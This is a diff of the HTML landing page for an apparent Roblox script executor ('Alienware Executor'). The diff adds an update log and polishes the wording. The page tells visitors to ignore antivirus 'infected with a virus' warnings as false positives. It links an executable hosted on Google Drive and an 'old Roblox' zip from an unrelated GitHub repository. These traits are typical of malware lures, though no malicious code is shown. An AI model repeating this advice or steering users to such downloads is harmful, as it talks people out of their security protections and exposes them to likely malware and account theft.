@@ -24,9 +24,12 @@
             background: linear-gradient(135deg, #3a3a3a, #252525);
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
             border-radius: 10px;
+            overflow-y: auto;
+            max-height: 90vh;
         }
         h1 {
             color: #00aaff;
+            font-size: 2em;
         }
         .status {
             margin: 20px 0;
@@ -50,12 +53,15 @@
             background-color: #f44336;
             color: #fff;
         }
-        .description, .notice {
+        .description, .notice, .UpdateLog {
             text-align: left;
             margin-top: 20px;
         }
         ul {
             padding-left: 20px;
+        }
+        .UpdateLog h2 {
+            margin-bottom: 10px;
         }
         .button {
             display: inline-block;
@@ -93,23 +99,38 @@
     <div class="container">
         <h1>Alienware Executor for Roblox</h1>
         <div class="status">
-            <p>Status: <span class="Fixing">🟧 Currently on fix</span></p>
+            <p>Status: <span class="Fixing">🟧 Currently being fixed</span></p>
         </div>
+
+        <div class="UpdateLog">
+            <h2>Update Log</h2>
+            <ul>
+                <li>Patched issues with some games preventing Alienware from attaching.</li>
+                <li>Improved attachment stability.</li>
+                <li>Added a warning when already attached.</li>
+                <li>UI improvements for a simpler and cleaner look.</li>
+                <li>New experimental settings for additional features.</li>
+                <li>Lua syntax highlighting now supports "function" and more.</li>
+                <li>Additional fixes and optimizations not listed here.</li>
+            </ul>
+        </div>
+
         <div class="notice">
             <h2>Notice</h2>
             <p>Alienware Executor is currently not working due to Roblox's latest security updates. We are working on a fix and will release an update soon. Thank you for your patience.</p>
+            
             <h2>Download Notice</h2>
             <p>If you see a message saying "Sorry, this file is infected with a virus," it's a false positive. You can safely ignore it and proceed with the download.</p>
+            
             <h2>Status Meaning</h2>
             <ul>
-                <p>You Need To Download Old Roblox Version For the Executor To work But Will Be Fixed Soon</p>
-            </ul>
-            <ul>
+                <p>You need to download an older version of Roblox for the executor to work, but this will be fixed soon.</p>
                 <li>🟩 = Working</li>
                 <li>🟧 = Currently under fixing/update</li>
                 <li>🟥 = Not working</li>
             </ul>
         </div>
+
         <div class="description">
             <h2>About Alienware Executor</h2>
             <p>Alienware Executor is a powerful tool that enhances your Roblox experience, allowing script execution and automation for smoother gameplay.</p>
@@ -120,8 +141,9 @@
                 <li>Dedicated support team</li>
                 <li>Latest Roblox compatibility</li>
                 <li>User-friendly interface</li>
-                <li>Save And Load Scripts</li>
+                <li>Save and load scripts</li>
             </ul>
+
             <h2>Perks of Joining Our Discord</h2>
             <ul>
                 <li>Exclusive sneak peeks of future updates</li>
@@ -130,9 +152,11 @@
                 <li>Fixes for common bugs</li>
             </ul>
         </div>
+
         <a href="https://drive.google.com/uc?export=download&id=1RY-y2b-XA0qz-ubBwG8lSWqYrKMYKoNU" class="button download-button">Download Alienware</a>
         <a href="https://github.com/nuag3ux/Cloudy/releases/download/r/rblx.zip" class="button download-Old-Roblox">Download Old Roblox</a>
         <a href="https://discord.gg/tzWPyZqn" class="button discord-button">Join Discord Server</a>
+
         <p>Alienware Executor is not affiliated with Roblox Corporation. All rights reserved.</p>
     </div>
 </body>
